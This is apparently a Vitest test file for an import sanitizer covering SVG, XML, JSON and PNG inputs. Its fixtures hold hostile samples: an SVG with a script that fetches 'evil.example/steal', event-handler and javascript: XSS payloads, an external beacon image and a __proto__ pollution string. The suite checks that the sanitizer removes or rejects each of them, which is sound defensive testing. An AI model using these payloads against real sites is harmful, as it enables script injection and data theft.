import { describe, expect, it } from 'vitest';
import {
  IMPORT_LIMITS,
  ImportRejectedError,
  assertJsonDepth,
  assertWithinByteLimit,
  bytesToBase64,
  rejectXmlDoctype,
  safeJsonParse,
  sanitizeSvg,
  svgToDataUri,
  validatePng,
} from '../src/domain/usecase/import-sanitizer.js';

/** Build a minimal valid PNG byte buffer with a chosen IHDR width/height. */
function makePngBytes(width: number, height: number, corruptMagic = false): Uint8Array {
  const bytes = new Uint8Array(33);
  const signature = [0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a];
  signature.forEach((byte, index) => (bytes[index] = byte));
  if (corruptMagic) {
    bytes[0] = 0x00;
  }
  const writeUint32 = (offset: number, value: number): void => {
    bytes[offset] = (value >>> 24) & 0xff;
    bytes[offset + 1] = (value >>> 16) & 0xff;
    bytes[offset + 2] = (value >>> 8) & 0xff;
    bytes[offset + 3] = value & 0xff;
  };
  writeUint32(16, width);
  writeUint32(20, height);
  return bytes;
}

describe('SVG sanitizer (ITEM-L2-001, C-03/C-04, ST-01..04)', () => {
  const malicious =
    '<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20">' +
    "<script>fetch('http://evil.example/steal')</script>" +
    '<rect width="10" height="10" onload="alert(1)" fill="#f00"/>' +
    '<a href="javascript:alert(1)">click</a>' +
    '<foreignObject><div onclick="evil()">x</div></foreignObject>' +
    '<image href="http://evil.example/beacon.png"/>' +
    '<image href="data:image/png;base64,iVBORw0KGgo="/>' +
    '</svg>';

  const sanitized = sanitizeSvg(malicious);

  it('removes <script> elements and their contents (ST-01)', () => {
    expect(sanitized).not.toContain('<script');
    expect(sanitized).not.toContain('fetch(');
    expect(sanitized).not.toContain('evil.example/steal');
  });

  it('removes on* event handler attributes (ST-02)', () => {
    expect(sanitized.toLowerCase()).not.toContain('onload');
    expect(sanitized.toLowerCase()).not.toContain('onclick');
    // the rect itself survives (allowlisted drawing element)
    expect(sanitized).toContain('<rect');
    expect(sanitized).toContain('fill="#f00"');
  });

  it('removes javascript: URLs and <a> elements (ST-01)', () => {
    expect(sanitized.toLowerCase()).not.toContain('javascript:');
    expect(sanitized).not.toContain('<a ');
  });

  it('removes <foreignObject> and its subtree (ST-04)', () => {
    expect(sanitized.toLowerCase()).not.toContain('foreignobject');
    expect(sanitized).not.toContain('evil()');
  });

  it('removes external image references but keeps embedded data-URI images (ST-03)', () => {
    expect(sanitized).not.toContain('http://evil.example/beacon.png');
    expect(sanitized).toContain('data:image/png;base64,iVBORw0KGgo=');
  });

  it('strips entity-obfuscated javascript: URLs on allowlisted elements', () => {
    const obfuscated =
      '<svg xmlns="http://www.w3.org/2000/svg"><use href="&#106;avascript:alert(1)"/></svg>';
    const result = sanitizeSvg(obfuscated);
    expect(result.toLowerCase()).not.toContain('javascript');
    expect(result).not.toContain('106');
  });

  it('wraps sanitized SVG into a self-contained data URI', () => {
    expect(svgToDataUri('<svg/>')).toMatch(/^data:image\/svg\+xml;base64,/);
  });

  it('rejects input with no <svg> root', () => {
    expect(() => sanitizeSvg('<div>not svg</div>')).toThrow(ImportRejectedError);
  });
});

describe('SVG resource limits (C-11, ST-13)', () => {
  it('rejects an SVG exceeding the node-count limit', () => {
    const many = '<rect/>'.repeat(IMPORT_LIMITS.maxSvgNodeCount + 5);
    expect(() => sanitizeSvg(`<svg xmlns="http://www.w3.org/2000/svg">${many}</svg>`)).toThrow(
      ImportRejectedError,
    );
  });

  it('rejects an SVG nested deeper than the depth limit', () => {
    const open = '<g>'.repeat(IMPORT_LIMITS.maxNestingDepth + 5);
    const close = '</g>'.repeat(IMPORT_LIMITS.maxNestingDepth + 5);
    expect(() => sanitizeSvg(`<svg xmlns="http://www.w3.org/2000/svg">${open}${close}</svg>`)).toThrow(
      ImportRejectedError,
    );
  });

  it('rejects an oversize payload before parsing', () => {
    expect(() => assertWithinByteLimit('x'.repeat(20), 8, 'test')).toThrow(ImportRejectedError);
  });
});

describe('XML DOCTYPE/ENTITY guard (C-07/C-08, ST-05/ST-06)', () => {
  it('rejects DOCTYPE declarations', () => {
    expect(() => rejectXmlDoctype('<!DOCTYPE svg SYSTEM "x"><svg/>')).toThrow(ImportRejectedError);
  });

  it('rejects ENTITY declarations (billion-laughs)', () => {
    expect(() => rejectXmlDoctype('<!ENTITY lol "lololol">')).toThrow(ImportRejectedError);
  });

  it('sanitizeSvg also rejects a DOCTYPE-bearing SVG', () => {
    expect(() => sanitizeSvg('<!DOCTYPE svg><svg xmlns="http://www.w3.org/2000/svg"/>')).toThrow(
      ImportRejectedError,
    );
  });
});

describe('JSON prototype-pollution + depth guards (C-06/C-11, ST-07)', () => {
  it('drops __proto__ / constructor / prototype keys', () => {
    const parsed = safeJsonParse('{"__proto__":{"polluted":true},"safe":1}') as Record<string, unknown>;
    expect(({} as Record<string, unknown>)['polluted']).toBeUndefined();
    expect(parsed['safe']).toBe(1);
    expect(parsed['polluted']).toBeUndefined();
  });

  it('rejects JSON nested beyond the depth limit', () => {
    let deep: unknown = 0;
    for (let level = 0; level < IMPORT_LIMITS.maxNestingDepth + 5; level += 1) {
      deep = [deep];
    }
    expect(() => assertJsonDepth(deep)).toThrow(ImportRejectedError);
  });
});

describe('PNG validation (ITEM-L2-001, C-09, ST-11/ST-13)', () => {
  it('accepts a valid PNG within dimension limits and returns a data URI', () => {
    const result = validatePng(makePngBytes(16, 16));
    expect(result.width).toBe(16);
    expect(result.height).toBe(16);
    expect(result.sanitizedDataUri).toMatch(/^data:image\/png;base64,/);
  });

  it('rejects a file with a bad PNG signature (extension spoofing)', () => {
    expect(() => validatePng(makePngBytes(16, 16, true))).toThrow(ImportRejectedError);
  });

  it('rejects a PNG whose dimensions exceed the limit', () => {
    expect(() => validatePng(makePngBytes(IMPORT_LIMITS.maxPngDimension + 1, 16))).toThrow(
      ImportRejectedError,
    );
  });

  it('rejects a PNG with non-positive dimensions', () => {
    expect(() => validatePng(makePngBytes(0, 16))).toThrow(ImportRejectedError);
  });
});

describe('base64 helper', () => {
  it('encodes bytes to standard base64', () => {
    expect(bytesToBase64(Uint8Array.from([104, 105]))).toBe('aGk=');
  });
});
